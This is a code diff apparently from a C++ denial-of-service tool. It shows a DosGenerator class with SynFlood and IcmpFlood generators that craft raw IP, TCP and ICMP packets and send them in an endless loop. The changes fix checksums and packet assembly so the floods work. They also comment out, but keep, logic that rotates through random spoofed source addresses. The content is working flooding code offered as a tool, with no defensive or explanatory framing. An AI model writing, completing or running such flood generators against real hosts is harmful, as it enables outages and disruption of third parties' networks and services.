@@ -47,10 +47,11 @@ bool DosGenerator::raw_init(int type)
     if((raw_fd_ = socket(AF_INET,SOCK_RAW,type))<0)
         return false;
 
+
     return true;
 }
 
-bool DosGenerator::init_iph(uint32_t src_ip, uint32_t dest_ip)
+bool DosGenerator::init_iph(uint32_t src_ip, uint32_t dest_ip,uint8_t protocol )
 {
     memset(&iph_,0,sizeof(struct iphdr));
 
@@ -59,7 +60,7 @@ bool DosGenerator::init_iph(uint32_t src_ip, uint32_t dest_ip)
     iph_.ihl=5;
     iph_.frag_off=htons(IP_DF); //don't flagment set
     iph_.ttl=64;
-    iph_.protocol=IPPROTO_TCP;
+    iph_.protocol=protocol;
 
 
     iph_.saddr = htonl(src_ip);
@@ -70,7 +71,7 @@ bool DosGenerator::init_iph(uint32_t src_ip, uint32_t dest_ip)
 
 }
 
-bool DosGenerator::init_iph(Ip &src_ip, Ip &dest_ip)
+bool DosGenerator::init_iph(Ip &src_ip, Ip &dest_ip, uint8_t protocol)
 {
     memset(&iph_,0,sizeof(struct iphdr));
 
@@ -79,7 +80,7 @@ bool DosGenerator::init_iph(Ip &src_ip, Ip &dest_ip)
     iph_.ihl=5;
     iph_.frag_off=htons(IP_DF); //don't flagment set
     iph_.ttl=64;
-    iph_.protocol=IPPROTO_TCP;
+    iph_.protocol=protocol;
 
 
     iph_.saddr = src_ip.get_ip();
@@ -141,15 +142,6 @@ void SynFlood::generate()
     syn_options_.windowScale.length=3;
     syn_options_.windowScale.shifCount=7;
 
-    //calculate IP, TCP Checksum.
-    calIPChecksum((uint8_t*)&iph_);
-    calTCPChecksum((uint8_t*)&iph_,sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(SynOptions));
-
-    //packet fill with ip, tcp, syn option
-    memcpy(packet,&iph_,sizeof(struct iphdr));
-    memcpy(packet + sizeof(struct iphdr),&tcph_,sizeof(struct tcphdr));
-    memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr),&syn_options_,sizeof(SynOptions));
-
 
     sockaddr_in dst_addr;
     dst_addr.sin_family=AF_INET;
@@ -157,6 +149,9 @@ void SynFlood::generate()
     dst_addr.sin_port = tcph_.dest;
 
     struct iphdr * iph = (struct iphdr *)packet;
+
+    calIPChecksum((uint8_t*)iph);
+    calTCPChecksum((uint8_t*)iph,sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(SynOptions));
 
     while(power_)
     {
@@ -185,10 +180,11 @@ void SynFlood::generate()
 bool IcmpFlood::init_icmph()
 {
     icmph_.type=8;
-    icmph_.type=0;
+    icmph_.code=0;
     srand(time(NULL));
     icmph_.un.echo.id = rand() % UINT16_MAX;
 
+    return true;
 }
 
 void IcmpFlood::generate()
@@ -196,12 +192,20 @@ void IcmpFlood::generate()
     iph_.tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + ICMP_DATA_LEN);
     //make packet buf
     uint8_t packet[sizeof(struct iphdr) + sizeof(struct icmphdr) + ICMP_DATA_LEN];
-
+    memset(data,6,ICMP_DATA_LEN);
     sockaddr_in dst_addr;
     dst_addr.sin_family=AF_INET;
     dst_addr.sin_addr.s_addr=iph_.daddr;
+    dst_addr.sin_port=0;
+
+    memcpy(packet,&iph_,sizeof(struct iphdr));
+    memcpy(packet + sizeof(struct iphdr),&icmph_,sizeof(struct icmphdr));
+    memcpy(packet+ sizeof(struct iphdr) + sizeof(struct icmphdr),data,ICMP_DATA_LEN);
+
 
     struct iphdr * iph = (struct iphdr *)packet;
+    calIPChecksum((uint8_t*)iph);
+    calICMPChecksum(packet, sizeof(struct iphdr) + sizeof(struct icmphdr) + ICMP_DATA_LEN);
 
     while(power_)
     {
@@ -209,19 +213,20 @@ void IcmpFlood::generate()
         if(sendto(raw_fd_,packet,sizeof(packet),MSG_EOR,(struct sockaddr *)&dst_addr,(socklen_t)sizeof(dst_addr))<0)
         {
             std::cout<<"send to error! here's packet."<<std::endl;
+            std::cout<<"Size of Packet : "<<sizeof(packet)<<std::endl;
             printByHexData(packet,sizeof(packet));
         }
 
-        //Auto Increase IP addr
-        if(!target_ip_.inc_ip_addr())
-        {
-            //if reach at end of network addr(braodcast)
-            target_ip_.set_rand_ip();
+//        //Auto Increase IP addr
+//        if(!sender_ip_.inc_ip_addr())
+//        {
+//            //if reach at end of network addr(braodcast)
+//            sender_ip_.set_rand_ip();
 
-        }
-        memcpy(&iph->saddr,target_ip_.get_ip_ptr(),4);
-        calIPChecksum((uint8_t*)iph);
-        calTCPChecksum((uint8_t*)iph,sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(SynOptions));
+//        }
+//        memcpy(&iph->saddr,sender_ip_.get_ip_ptr(),4);
+//        calIPChecksum((uint8_t*)iph);
+//        calICMPChecksum(packet, sizeof(struct iphdr) + sizeof(struct icmphdr) + ICMP_DATA_LEN);
     }
 
 }
